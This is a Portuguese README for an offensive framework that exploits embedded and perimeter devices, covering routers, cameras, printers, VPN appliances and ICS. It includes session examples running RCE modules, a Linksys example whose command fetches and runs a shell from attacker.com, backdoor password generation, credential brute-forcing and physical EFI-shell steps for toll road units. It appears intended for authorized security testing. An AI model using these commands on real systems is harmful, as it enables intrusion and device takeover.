<p align="center">
  <img src="docs/img/embedxpl-forge-banner_16x9.png" alt="EmbedXPL-Forge" width="100%">
</p>

# EmbedXPL-Forge

**Framework de Avaliação de Segurança em Dispositivos Embarcados e de Perímetro**

EmbedXPL-Forge é um framework open-source de exploração e scanning para profissionais de segurança auditarem roteadores, switches, câmeras IP, NVR/DVR, GPON ONTs, CPEs de ISP, impressoras, dispositivos IoT, OT/ICS e dispositivos embarcados. Oferece **2800+ módulos ativos** cobrindo testes de credenciais, exploração de vulnerabilidades, varredura de rede, geração de payloads, ataques a câmeras RTSP, manipulação de firmware, arsenal completo de impressoras e orquestração PolyExploit multilinguagem — com **700+ CVEs** mapeados em **114+ fabricantes** e um **APT Group Attack Engine** que reproduz cadeias de ataque reais de grupos nação-estado.

> **Versão:** 3.2.0


## Funcionalidades

- **625+ módulos de exploit** — RCE, auth bypass, path traversal, info disclosure, buffer overflow, DNS hijacking, command injection, backdoor, CSRF, config decrypt, gerador WPA/WPS, gerador de senha de fábrica, chains de heap/stack BOF
- **88 módulos de credenciais** — ataques de dicionário contra FTP, SSH, Telnet, HTTP, SNMP, SFTP
- **185+ módulos para impressoras** — HP, Canon, Lexmark, Xerox, Ricoh, Brother, Epson, Kyocera, Samsung; PJL/IPP/LPD/WSD/CUPS; chains Pwn2Own 2026; PrintingShellz; MS-RPRN NTLM coercion
- **Motor RTSP completo** — portado do [cameradar](https://github.com/ullaakut/cameradar): brute-force de rotas (195+ rotas), brute-force de credenciais (80+ pares), auth Basic/Digest, RTSPS/TLS, **tunelamento RTSP-over-HTTP (Python puro, RFC 2326 App-C)**, scanner nmap/masscan/direto, ONVIF WS-Discovery
- **7 scripts NSE Nmap personalizados** — descoberta RTSP, fingerprint de câmera, validação CVE Hikvision/Dahua, teste de credenciais padrão, verificação multi-vendor CVE, captura de snapshot (`pip install embedxpl[nse]`)
- **Suite de exploração de firmware** — detecção de formato, injeção de backdoor, patch de checksum, bypass de flash por fabricante (NETGEAR, TP-Link, D-Link, ASUS)
- **Orquestrador PolyExploit** — compilação C/C++ em tempo de execução (gcc/clang/mingw/cross), execução de exploits Ruby/Node.js/PHP/Bash/Perl, integração msfconsole, integração ExploitDB/searchsploit
- **Módulos ICS/OT** — Universal Robots PolyScope 5, RIOT OS, Modbus, S7comm, EtherNet/IP, BACnet, DNP3
- **Smart home / marítimo / especializado** — eNet SMART HOME, OpenRemote, Metis maritime IoT (WIC/DFS)
- **5+ módulos de scanner** — AutoPwn, scanners específicos por dispositivo, descoberta WSD/mDNS de impressoras
- **32 módulos de payload** — reverse/bind TCP shells para x86, x64, ARM, MIPS, Python, Perl, PHP
- **13 módulos de encoder** — Base64 e hex encoding para Python, PHP, Perl
- **14 módulos genéricos** — Heartbleed, ShellShock, UPnP IGD, SNMP bruteforce, TCP Xmas, amplificação UDP, consulta CVE, detector DNS hijack, interceptor AITM
- **700+ CVEs mapeados** — de 2001 a 2026, incluindo chains Pwn2Own 2026 e CVEs críticos de IoT/OT/marítimo
- **APT Group Attack Engine** — reproduz cadeias de ataque do APT28, Volt Typhoon, Sandworm, Quad7, Turla, APT40 com mapeamento MITRE ATT&CK
- **23+ wordlists por fabricante** — credenciais padrão externalizadas por vendor (incluindo ISPs brasileiros específicos)
- **7 gates de qualidade automatizados** — `tools/phase_gate.py` garante que cada módulo passa verificações de importação, anti-falso-positivo, referências e qualidade de código

## Tipos de Dispositivos Suportados

| Tipo | Cobertura | Descrição |
|------|-----------|-----------|
| **Roteadores / GPON ONT / CPE** | 580+ módulos | Roteadores SOHO, gateways enterprise, CPE/ONT GPON |
| **Câmeras IP / NVR / DVR** | 60+ módulos | Hikvision, Dahua, Axis, Reolink, Amcrest, Uniview, Tapo, Swann, ANNKE, Edimax, Intelbras e mais |
| **Impressoras / MFP** | 185+ módulos | HP, Canon, Lexmark, Xerox, Ricoh, Brother, Epson, Kyocera, Samsung; IPP/PJL/LPD/WSD/CUPS |
| **NAS (Armazenamento em Rede)** | 20+ módulos | QNAP, Synology, D-Link NAS, Zyxel |
| **VPN / Firewall / NGFW / Segurança de Perímetro** | **202 módulos** | Palo Alto, Fortinet, Cisco ASA/FTD/FMC, Check Point, Juniper, SonicWall, Sophos, WatchGuard, Zyxel, F5 BIG-IP, Citrix/NetScaler, Ivanti, Pulse Secure, pfSense, OPNsense, Barracuda, Imperva, MikroTik, Huawei USG, Stormshield, Hillstone, Sangfor, H3C, Radware, Symantec ProxySG, Trend Micro TippingPoint, Trellix, Arista EOS, OpenVPN AS, Phoenix Contact mGuard, Siemens SCALANCE, Moxa EDR, VyOS, IPFire, Kerio, Cisco Meraki, Array Networks + módulos de bypass de protocolo OT/ICS |
| **Switches L2/L3** | 3 módulos | Switches gerenciados (Cisco, D-Link, NETGEAR) |
| **SOHO Edge** | 9 módulos | Roteadores de viagem, NAS, APs wireless |
| **ICS / OT / Industrial** | 35+ módulos | PLCs, SCADA, Modbus, S7comm, EtherNet/IP, Universal Robots PolyScope 5 |
| **Smart Home / Marítimo** | 10+ módulos | eNet SMART HOME, OpenRemote IoT, Metis maritime WIC/DFS |
| **SO Embarcado** | 25+ módulos | RIOT OS, OpenWrt, VxWorks, QNX, wolfSSL, Tuya Arduino SDK |

## Fabricantes Suportados

**Equipamentos de rede:** 2Wire · 3Com · ActionTec · Alcatel-Lucent · Alpha Networks · Arris · Aruba · Asmax · Astoria · ASUS · Belkin · BHU · Billion · Binatone · Calix · CERIO · Cisco · Cobham · Comtrend · D-Link · DD-WRT · Draytek · EasyBox (Arcadyan) · Edimax · EE BrightBox · FiberHome · Fortinet · Freebox · GL.iNet · GPON · HooToo · Huawei · Intelbras · IPFire · Juniper · LG · Linksys · Mercury · MiFi (Novatel) · MikroTik · MitraStar · Motorola · Movistar · Netcore · NETGEAR · Netsys · Observa Telecom · OpenWrt · RuggedCom · Ruijie · Seagate · SerComm · Shuttle · Sitecom · SMC · SonicWall · Starbridge · Technicolor · Tenda · Thomson · TOTOLINK · TP-Link · TRENDnet · Ubee · Ubiquiti · Unicorn · UTStarcom · Wavlink · Xiaomi · Zhone · Zoom · ZTE · ZyXEL

**Câmeras / NVR / DVR:** Hikvision · Dahua · Axis · Reolink · Amcrest · Uniview (UNV) · Tapo (TP-Link) · Swann · ANNKE · Edimax · Intelbras · Grandstream · Foscam · Acti · Avigilon · Beward · Brickcom · Cisco câmeras · Geuterbruck · Honeywell câmeras · Jovision · Siemens câmeras · Xiongmai (OEM) · Zivif · MVPower DVR · Câmeras P2P WiFi genéricas · DVR/NVR OEM genérico

**NAS / VPN / Segurança:** QNAP · Synology · D-Link NAS · Zyxel NAS · Ivanti · SonicWall · Fortinet · Avocent

## Instalação

### Opção 1 — PyPI (recomendado)

```bash
pip install embedxpl
embedxpl
```

### Opção 2 — Com scripts Nmap NSE

```bash
pip install "embedxpl[nse]"
python -m embedxpl.nse install   # pode exigir sudo no Linux/macOS
embedxpl-nse list
```

### Opção 3 — A partir do código-fonte

```bash
git clone https://github.com/mrhenrike/EmbedXPL-Forge.git
cd EmbedXPL-Forge
pip install -r requirements.txt
python exf.py
```

## Uso Rápido

```
# Shell interativo
python exf.py

# Módulo de roteador — RCE Netgear DGN1000B
exf > use exploits/routers/netgear/dgn1000b_remote_command_execution
exf (DGN1000B RCE) > set target 192.168.1.1
exf (DGN1000B RCE) > run

# Gerador de chave WPA padrão — EasyBox (Arcadyan)
exf > use exploits/routers/easybox/easybox_wpa_keygen
exf (EasyBox WPA Keygen) > set target 192.168.1.1
exf (EasyBox WPA Keygen) > run

# Backdoor RCE — Seagate NAS Ghost PHP
exf > use exploits/routers/seagate/seagate_nas_php_backdoor
exf (Seagate Ghost PHP) > set target 192.168.1.100
exf (Seagate Ghost PHP) > set cmd "id; uname -a"
exf (Seagate Ghost PHP) > run

# Alpha Networks / ZTE — web_shell_cmd.gch backdoor
exf > use exploits/routers/alpha_networks/web_shell_cmd_rce
exf (Alpha Networks web_shell_cmd RCE) > set target 192.168.1.1
exf (Alpha Networks web_shell_cmd RCE) > set cmd "cat /etc/passwd"
exf (Alpha Networks web_shell_cmd RCE) > run

# RuggedCom — gerador de senha de backdoor de fábrica
exf > use exploits/routers/ruggedcom/ruggedcom_factory_password
exf (RuggedCom Factory Password) > set target 192.168.1.1
exf (RuggedCom Factory Password) > set serial RA000000
exf (RuggedCom Factory Password) > run
[*] Calculando senha para serial: RA000000
[+] Backdoor user : factory
[+] Backdoor pass : 7f3d9a2b

# Motor de câmera RTSP — ataque completo
exf > use exploits/cameras/multi/rtsp_cameradar_attack
exf (RTSP Cameradar Attack) > set target 192.168.1.100
exf (RTSP Cameradar Attack) > run

# Descoberta de rede
exf > discover 192.168.1.0/24

# APT Group Attack Engine
exf > apt list
exf > apt show apt28
exf > apt run apt28
```

## Comandos Principais

| Comando | Descrição |
|---------|-----------|
| `use <modulo>` | Selecionar um módulo |
| `show options` | Exibir opções configuráveis |
| `show info` | Exibir metadados e referências |
| `set <opcao> <valor>` | Configurar uma opção |
| `check` | Verificar se o alvo é vulnerável |
| `run` | Executar o módulo |
| `search <termo>` | Buscar módulos por palavra-chave |
| `discover [subnet]` | Escanear subnet e sugerir módulos |
| `apt list\|show\|run` | Motor de ataque APT group |
| `sessions list\|show\|export` | Gerenciar histórico de sessões |

## Scripts NSE Nmap

```bash
# Instalar scripts NSE do EmbedXPL
pip install "embedxpl[nse]"
python -m embedxpl.nse install

# Descoberta RTSP
nmap -p 554,5554,8554 --script embedxpl-rtsp-discover 192.168.1.0/24

# Verificação de CVE Hikvision
nmap -p 80,443,8000 --script embedxpl-hikvision-vuln 192.168.1.100

# Identificação de câmera
nmap -p 80,443,554 --script embedxpl-camera-identify 192.168.1.0/24

# Verificação multi-vendor CVE IoT
nmap -p 80,443,8080 --script embedxpl-iot-cve-check 192.168.1.0/24

# Capture snapshot sem autenticação
nmap -p 80,8080 --script embedxpl-camera-snapshot 192.168.1.100
```

## Estrutura de Módulos

```
embedxpl/
├── core/
│   ├── rtsp/          # Motor RTSP completo
│   └── poly/          # Orquestrador PolyExploit (C/C++, Ruby, Node.js, PHP, Bash, Perl)
├── modules/
│   ├── creds/             # Testes de credenciais
│   ├── exploits/
│   │   ├── cameras/       # Câmeras IP por fabricante
│   │   ├── firmware/      # Exploração de firmware
│   │   ├── nas/           # NAS (QNAP, Synology, D-Link NAS)
│   │   ├── routers/       # Roteadores por fabricante (85 pastas de vendor)
│   │   ├── vpn/           # Appliances VPN/firewall
│   │   └── switches/      # Exploits de switches
│   ├── scanners/          # Varredura e AutoPwn
│   ├── payloads/          # Shells reversos/bind (multi-arch)
│   ├── encoders/          # Encoding de payloads
│   └── generic/           # Ferramentas genéricas
├── nse/                   # Gerenciador de scripts NSE
└── resources/rtsp/        # Rotas e credenciais RTSP
```

## Cobertura Routerpwn / Backdoor / Senha de Fabrica

27+ modulos de exploit portados de uma auditoria completa do [routerpwn.com](https://github.com/hkm/routerpwn.com) e do [routerPWN](https://github.com/lilloX/routerPWN), com foco em senhas de fabrica, backdoors hardcoded, geradores WPA padrao e CSRF de DNS hijack. **27+ modulos** cobrindo **19+ fabricantes**:

| Fabricante | Técnica explorada |
|------------|-------------------|
| Alcatel-Lucent | OmniPCX Enterprise RCE via masterCGI · OmniSwitch CSRF add admin |
| Alpha Networks / ZTE | Backdoor `/web_shell_cmd.gch` · download de config sem auth |
| Astoria | Reset de senha admin sem autenticação via `setup_pass.cgi` |
| Binatone | CSRF mudança de admin via `Forms/tools_admin_1` |
| DD-WRT | `Info.live.htm` (BID-35742) disclosure · injeção de comando via diagnóstico ping |
| EasyBox (Arcadyan) | Gerador de chave WPA2 de fábrica (algoritmo MAC → MD5) |
| EE BrightBox | Disclosure de configuração via `cgi_status.js` sem auth |
| Freebox | Reboot forçado via `system.cgi` sem autenticação |
| MiFi (Novatel) | Download de backup `config.xml.savefile` — credenciais expostas |
| Motorola SBG6580 | DNS CSRF + mudança de senha admin + reboot |
| Observa Telecom | Disclosure JSON de credenciais + DNS CSRF + ativação FTP |
| RuggedCom | Gerador de senha de backdoor de fábrica (FD 2012/Apr/277) |
| Seagate NAS | "Ghost PHP" RCE — `d41d8cd98f...php` (CVE-2014-8684) |
| Sitecom | DC-227 backdoor + gerador WPA WLR-4004 (eMaze 2014) |
| Starbridge | Lynx 526 reset de senha sem auth via `password.cgi` |
| Ubee | Bypass credencial de operador para modems a cabo (Cablemas ISP) |
| Unicorn | WB-3300NR factory reset + DNS CSRF sem auth |
| UTStarcom | Disclosure de credenciais PPPoE via `ppppassword.html` |
| Zoom | X4/X5 criação de admin via `PopOutUserAdd.htm` (EDB-26736) |

## Novos Modulos - Batch BLOCO v2.0

Esta secao documenta os modulos adicionados no batch de expansao BLOCO K, L, D, H, N e I.

---

### BLOCO K - Dispositivos ISP Brasileiros

Exploits e scanners voltados para CPEs e cameras IP comumente distribuidas por provedores de internet brasileiros (Claro, Vivo, TIM, OI, Algar e equipamentos baseados em Sercomm).

| Dispositivo | CVE | Caminho do Modulo | Tipo de Ataque |
|-------------|-----|-------------------|----------------|
| TP-Link TL-SC3171 / SC4171 / SC4171G | CVE-2013-2573 | `exploits/cameras/tplink/tl_sc_series_cmd_inject_cve_2013_2573` | Injecao de Comando (sem auth) |
| TP-Link TL-SC3171 / SC3130 | CVE-2013-2581 | `exploits/cameras/tplink/tl_sc_series_unauth_firmware_upload_cve_2013_2581` | Upload de Firmware sem Autenticacao |
| D-Link DCS-932L | CVE-2026-36983 | `exploits/cameras/dlink/dcs_932l_light_sensor_rce_cve_2026_36983` | RCE via Sensor de Luz |
| D-Link DCS-932L | CVE-2025-5573 | `exploits/cameras/dlink/dcs_932l_admin_cmd_inject_cve_2025_5573` | Injecao de Comando no Painel Admin |
| D-Link DCS-933L | CVE-2026-2218 | `exploits/cameras/dlink/dcs_933l_admin_cmd_inject_cve_2026_2218` | Injecao de Comando no Painel Admin |
| ZTE ZXHN H267N / H268N | CVE-2026-34473 | `exploits/routers/zte/zxhn_h267n_h268n_dos_cve_2026_34473` | Negacao de Servico |
| ZTE ZXHN H298A / H108N | CVE-2026-34474 | `exploits/routers/zte/zxhn_h298a_cred_dump_cve_2026_34474` | Dump de Credenciais (ETHCheat) |
| Intelbras IWR roteadores | - | `exploits/routers/intelbras/iwr_luci_rpc_rce` | RCE via LuCI RPC sem Autenticacao |
| Scanner multi-vendor ISP BR | - | `scanners/specialized/br_isp_scanner` | Descoberta ativa + verificacao de vuln |

**Exemplos de uso:**

```bash
# ZTE ZXHN H298A - Dump de Credenciais
embedxpl use routers/zte/zxhn_h298a_cred_dump_cve_2026_34474
embedxpl (ZXHNCred) > set rhost 192.168.1.1
embedxpl (ZXHNCred) > run

# Saida esperada (dispositivo vulneravel):
[+] Conectado em 192.168.1.1:80
[+] Enviando requisicao ETHCheat: GET /getpage.lua?pid=1000&ETHCheat=1
[!] VULNERAVEL: Credenciais expostas
    Senha Admin: admin123
    WPA PSK: MinhaWifi
    SSID: ZTE_Router_ABC

# Saida (nao vulneravel):
[-] Nenhum campo de credencial encontrado na resposta
[-] Alvo pode estar corrigido ou com firmware diferente
```

```bash
# Intelbras IWR LuCI RPC RCE
embedxpl use routers/intelbras/iwr_luci_rpc_rce
embedxpl (IWRLuci) > set rhost 192.168.0.1
embedxpl (IWRLuci) > set cmd "id"
embedxpl (IWRLuci) > run

# Saida esperada:
[+] Endpoint LuCI RPC encontrado em /cgi-bin/luci/rpc/sys
[+] RCE via sys.exec: uid=0(root) gid=0(root)
```

```bash
# Scanner de ISPs brasileiros multi-vendor
embedxpl use scanners/specialized/br_isp_scanner
embedxpl (BRISPScan) > set target 192.168.0.0/24
embedxpl (BRISPScan) > run
```

**Notas:** CVE-2026-34474 afeta ZTE ZXHN H298A 1.1 e H108N 2.6. Sem autenticacao necessaria.
**Legal:** Use apenas em dispositivos de sua propriedade ou com autorizacao escrita expressa.

---

### BLOCO L - Portes RouterPWN

Exploits classicos e modernos do catalogo RouterPWN portados para o formato de modulo EmbedXPL-Forge.

| Dispositivo | CVE / Referencia | Caminho do Modulo | Tipo de Ataque |
|-------------|-----------------|-------------------|----------------|
| Cobham Aviator 700 SATCOM | CVE-2014-2943 | `exploits/specialized/vsat/cobham_aviator_admin_reset_cve_2014_2943` | Reset de Senha Admin (sem auth) |
| Huawei HG8245H | - | `osint/keygen/huawei_hg8245_wpa_keygen` | Gerador de Chave WPA Padrao |
| Alcatel-Lucent OmniPCX Enterprise | - | `exploits/voip/alcatel_lucent/omnipcx_enterprise_mastercgi_rce` | RCE via masterCGI sem autenticacao |
| Linksys E-Series (The Moon) | EDB-31683 | `exploits/routers/linksys/eseries_themoon_rce_tmunblock` | RCE via tmUnblock.cgi |
| NETGEAR DGN2200 | EDB-24665 | `exploits/routers/netgear/dgn2200_open_telnetd_rce` | RCE via open-telnetd sem auth |
| Siemens FlexiISN | - | `exploits/routers/siemens/flexiisn_auth_bypass` | Bypass de Autenticacao |
| Thomson BTHomeHub | - | `exploits/routers/thomson/bthomehub_voice_hijack` | Sequestro de Configuracao VoIP |
| AT&T 2Wire Gateway | - | `exploits/routers/two_wire/atandt_gateway_crlf_dos` | Injecao CRLF / DoS |

**Exemplos de uso:**

```bash
# Reset admin Cobham Aviator (terminal VSAT / Satelite)
embedxpl use specialized/vsat/cobham_aviator_admin_reset_cve_2014_2943
embedxpl (CobhamReset) > set rhost 192.168.1.1
embedxpl (CobhamReset) > run

# Saida esperada:
[+] Conectado na interface Cobham Aviator 700
[+] Enviando requisicao de reset admin sem autenticacao
[!] VULNERAVEL: Senha admin redefinida para padrao

# Linksys eSeries The Moon RCE
embedxpl use routers/linksys/eseries_themoon_rce_tmunblock
embedxpl (TheMoon) > set rhost 192.168.1.1
embedxpl (TheMoon) > set cmd "busybox wget http://attacker.com/shell -O /tmp/sh && chmod +x /tmp/sh && /tmp/sh"
embedxpl (TheMoon) > run

# Gerador de chave WPA Huawei HG8245H
embedxpl use osint/keygen/huawei_hg8245_wpa_keygen
embedxpl (HuaweiKeygen) > set ssid "HG8245H-ABCDEF"
embedxpl (HuaweiKeygen) > run
# Saida: [+] Chave WPA prevista: xA7z3k9P
```

**Notas:** The Moon worm (CVE Linksys E-Series) explora tmUnblock.cgi sem autenticacao em firmwares < 2.0.08.
**Legal:** Use apenas em dispositivos de sua propriedade ou com autorizacao escrita expressa.

---

### BLOCO D - Framework de Cliente RTSP

Biblioteca Python RFC 2326 RTSP/1.0 pura que serve como base para todos os modulos de ataque a cameras RTSP.

**Modulo:** `network/rtsp/rtsp_client.py` - classe `RTSPClient`

**Funcionalidades:**
- Metodos OPTIONS, DESCRIBE, SETUP, PLAY, TEARDOWN
- Autenticacao Basic e Digest (RFC 2617)
- Parsing de descricao de sessao SDP
- Gerenciamento de timeout e reconexao automatica
- Suporte a context manager (`with RTSPClient(...) as client`)

**Exemplo de uso:**

```bash
# Uso direto via API Python
python3 -c "
from embedxpl.modules.network.rtsp.rtsp_client import RTSPClient
with RTSPClient('192.168.1.10', 554, timeout=5) as client:
    resp = client.describe('/live/ch0')
    if resp.status_code == 200:
        sdp = client.parse_sdp(resp.body)
        print(f'Streams: {[s.media_type for s in sdp.streams]}')
"
```

```bash
# Brute force de credenciais RTSP (usa RTSPClient internamente)
embedxpl use network/rtsp/rtsp_cred_brute
embedxpl (RTSPBrute) > set rhost 192.168.1.10
embedxpl (RTSPBrute) > set rport 554
embedxpl (RTSPBrute) > set path /live/ch0
embedxpl (RTSPBrute) > run

# Saida esperada:
[+] Tentando admin:admin ... 401 Unauthorized
[+] Tentando admin:12345 ... 200 OK
[!] VALIDO: admin:12345
```

**Requisitos:** Python 3.8+, sem dependencias externas.

---

### BLOCO H - Consulta FCC-ID

Modulo OSINT que consulta o banco de dados de autorizacao de equipamentos da FCC para recuperar detalhes do dispositivo a partir de codigos FCC-ID encontrados em etiquetas fisicas.

**Modulo:** `osint/fcc_id_lookup.py`

**Exemplo de uso:**

```bash
embedxpl use osint/fcc_id_lookup
embedxpl (FCCLookup) > set fcc_id "PD5-WNR3500U"
embedxpl (FCCLookup) > run

# Saida esperada:
[+] FCC ID: PD5-WNR3500U
    Fabricante: NETGEAR Inc.
    Produto: WNR3500U Wireless-N Gigabit Router
    Frequencia: 2.4GHz / 5GHz
    Autorizacao: OET-65C
    Laboratorio: SGS
    Data de Aprovacao: 2009-11-18
    Fotos Internas: [URL]
    Fotos Externas: [URL]
    Relatorio de Teste: [URL]
```

**Dicas:**
- FCC IDs estao impressos nas etiquetas do dispositivo (formato: `CODIGO_GRANTEE-CODIGO_PRODUTO`)
- Util para identificar hardware OEM, base de firmware ou cadeia de fornecedores
- Combine com `osint/github_recon` para encontrar repositorios de firmware publicos

**Requisitos:** Acesso a internet, biblioteca `requests`.

---

### BLOCO N - Gerador de URL de Camera iSpy

Gera URLs de stream conhecidas com base no fabricante, modelo e versao de firmware, usando o formato do banco de dados de cameras iSpy.

**Modulo:** `osint/camera_url_generator.py`

**Exemplo de uso:**

```bash
embedxpl use osint/camera_url_generator
embedxpl (CameraURL) > set vendor "hikvision"
embedxpl (CameraURL) > set model "DS-2CD2143G2"
embedxpl (CameraURL) > run

# Saida esperada:
[+] URLs de stream conhecidas para Hikvision DS-2CD2143G2:
    [1] rtsp://<ip>:554/Streaming/Channels/101
    [2] rtsp://<ip>:554/Streaming/Channels/102
    [3] rtsp://<ip>:554/h264/ch1/main/av_stream
    [4] http://<ip>/ISAPI/Streaming/channels/1/picture
    [5] http://<ip>/onvif/device_service

# Gerar wordlist para brute force RTSP
embedxpl (CameraURL) > set output_file /tmp/hikvision_routes.txt
embedxpl (CameraURL) > run
```

**Dicas:**
- Combine com `network/rtsp/rtsp_route_brute` para enumerar streams ativos
- Suporta 300+ fabricantes de cameras do banco de dados iSpy
- Use `set all_vendors true` para exportar todas as URLs conhecidas

---

### BLOCO I - Modulos de Fiscalizacao de Transito

Modulos voltados para infraestrutura de fiscalizacao de transito (RSUs de pedagio eletronico, radares, cameras ANPR).

#### Kapsch TrafficCom RSU EFI Shell (CVE-2025-25734)

**Modulo:** `exploits/specialized/traffic_enforcement/kapsch_rsu_efi_shell_cve_2025_25734`

**Vulnerabilidade:** Road-Side Units (RSUs) da Kapsch utilizadas em sistemas de pedagio eletronico carecem de enforces de UEFI Secure Boot e senha de BIOS, permitindo que atacantes com acesso fisico acessem o shell EFI interativo e o sistema de arquivos completo.

**Impacto:** Extracao de configuracao, roubo de chaves TLS privadas, instalacao de implantes, bypass da funcionalidade de fiscalizacao.

**Exemplo de uso:**

```bash
# Verificacao de alcance de rede (deteccao de interface de gerenciamento)
embedxpl use specialized/traffic_enforcement/kapsch_rsu_efi_shell_cve_2025_25734
embedxpl (KapschRSU) > set rhost 10.0.0.50
embedxpl (KapschRSU) > check

# Saida esperada (interface de gerenciamento exposta):
[+] Interface de gerenciamento Kapsch RSU detectada em 10.0.0.50:80
[!] Indicador de banner: 'TrafficCom RSU' encontrado
[*] NOTA: Exploracao completa requer acesso fisico presencial

# Relatorio de avaliacao
embedxpl (KapschRSU) > run
# Gera: passos de ataque, checklist de mitigacoes, nivel de risco
```

**Passos de exploracao fisica:**
1. Abrir o gabinete RSU (parafusos anti-violacao)
2. Conectar teclado USB e monitor na placa-mae do RSU
3. Reiniciar - pressionar ESC/DEL/F2 durante o POST
4. Navegar: Boot Manager -> EFI Internal Shell
5. Acessar sistema de arquivos: `fs0:\efi\config\` para extracao de configuracao

**Requisitos:** Acesso fisico ao hardware RSU (monitor + teclado USB), ou acesso de rede a interface de gerenciamento para deteccao de banner.
**Legal:** Acesso nao autorizado a infraestrutura de fiscalizacao de transito e crime. Use apenas em equipamentos de sua propriedade ou com autorizacao escrita expressa para avaliacao de segurança.

---

## Arquitetura do Framework (v3.1.0)

### Arquitetura de Componentes

Visao em camadas do framework: camada CLI, Core Engine (orquestrador, clientes de protocolo, shell engines), Camada de Inteligencia (ML, OUI, banco CVE), Quality Gates e o arsenal de 2800+ modulos organizados por categoria.

<p align="center">
  <img src="docs/assets/embedxpl_architecture.png" width="960" alt="EmbedXPL-Forge Arquitetura de Componentes v3.1.0"/>
</p>

### Fluxo de Auditoria e Exploracao

Fluxo de ponta a ponta: entrada do alvo, descoberta, identificacao, selecao de modulo, exploracao e relatorio.

<p align="center">
  <img src="docs/assets/embedxpl_flow.png" width="960" alt="EmbedXPL-Forge Fluxo de Exploracao v3.1.0"/>
</p>


## Requisitos

- Python 3.8+
- Opcional: `nmap` (binário) para descoberta e scripts NSE
- Opcional: `masscan` para descoberta RTSP de alta velocidade
- Opcional: `gcc`/`clang` para compilação C/C++ pelo PolyExploit
- Opcional: `msfconsole` para integração Metasploit via PolyRunner

**Dependências Python (instaladas automaticamente):**
`requests`, `paramiko`, `pysnmp`, `pycryptodome`, `scapy`, `colorama`, `rich`, `python-nmap`, `aiohttp`

## Aviso Legal

EmbedXPL-Forge é destinado exclusivamente para testes de segurança autorizados e pesquisa. Use esta ferramenta apenas em sistemas que você possui ou tem permissão explícita e escrita para testar. Acesso não autorizado a sistemas computacionais é ilegal. Os autores não assumem responsabilidade por uso indevido.

## Licença

Licença BSD — veja [LICENSE](LICENSE) para detalhes.
